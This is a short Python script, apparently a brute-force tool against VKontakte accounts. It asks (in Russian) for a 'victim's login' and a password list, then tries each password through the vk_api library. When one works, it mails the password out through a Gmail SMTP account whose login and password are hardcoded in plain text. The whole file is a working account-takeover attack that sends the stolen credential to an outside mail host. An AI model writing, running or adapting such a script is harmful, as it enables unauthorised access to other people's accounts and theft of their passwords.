import vk_api
from os import system
import smtplib
smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
smtpObj.starttls()
smtpObj.login('kirilpupi@gmail.com','animegovno5')
a = 10
if __name__ == '__main__':
    p = input('ваша почта:')
    phone = input('логин жерты:')
    passlist = input('Enter password_list: ')
    pass_found = open(passlist, 'r')
    for password in pass_found:
        try:
            vk_session = vk_api.VkApi(phone, password)
            vk_session.auth()
            print("FAUND: " + password)
            smtpObj.sendmail("justkiddingboat@gmail.com", p, "{}".format(password))
            break
        except:
            print(password + ' BAD')
